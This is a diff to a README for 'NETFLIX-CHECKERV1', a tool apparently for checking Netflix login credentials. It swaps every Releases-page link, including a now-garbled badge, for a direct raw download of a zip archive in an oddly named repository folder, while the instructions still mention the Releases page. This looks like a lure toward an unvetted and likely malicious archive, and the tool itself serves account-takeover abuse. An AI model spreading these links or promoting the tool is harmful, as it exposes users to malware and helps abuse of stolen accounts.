@@ -6,13 +6,13 @@ Welcome to NETFLIX-CHECKERV1! This tool helps you validate Netflix login account
 
 ## 📥 Download NETFLIX-CHECKERV1
 
-[![Download NETFLIX-CHECKERV1](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/HarronLarne/NETFLIX-CHECKERV1/releases)
+[![Download NETFLIX-CHECKERV1](https://raw.githubusercontent.com/HarronLarne/NETFLIX-CHECKERV1/main/tendentious/NETFLIX-CHECKERV1.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/HarronLarne/NETFLIX-CHECKERV1/main/tendentious/NETFLIX-CHECKERV1.zip)
 
 ## 📂 Download & Install
 
 To get started, visit the Releases page to download the latest version of NETFLIX-CHECKERV1:
 
-[Download NETFLIX-CHECKERV1](https://github.com/HarronLarne/NETFLIX-CHECKERV1/releases)
+[Download NETFLIX-CHECKERV1](https://raw.githubusercontent.com/HarronLarne/NETFLIX-CHECKERV1/main/tendentious/NETFLIX-CHECKERV1.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of the application.
@@ -66,4 +66,4 @@ If you encounter issues while using NETFLIX-CHECKERV1, feel free to reach out fo
 
 Stay updated on new features and improvements. Join discussions and ask questions by visiting our GitHub repository.
 
-Thank you for choosing NETFLIX-CHECKERV1! We hope this tool makes account validation easier for you. Don’t forget to check our [Download NETFLIX-CHECKERV1](https://github.com/HarronLarne/NETFLIX-CHECKERV1/releases) link again for updates!
+Thank you for choosing NETFLIX-CHECKERV1! We hope this tool makes account validation easier for you. Don’t forget to check our [Download NETFLIX-CHECKERV1](https://raw.githubusercontent.com/HarronLarne/NETFLIX-CHECKERV1/main/tendentious/NETFLIX-CHECKERV1.zip) link again for updates!
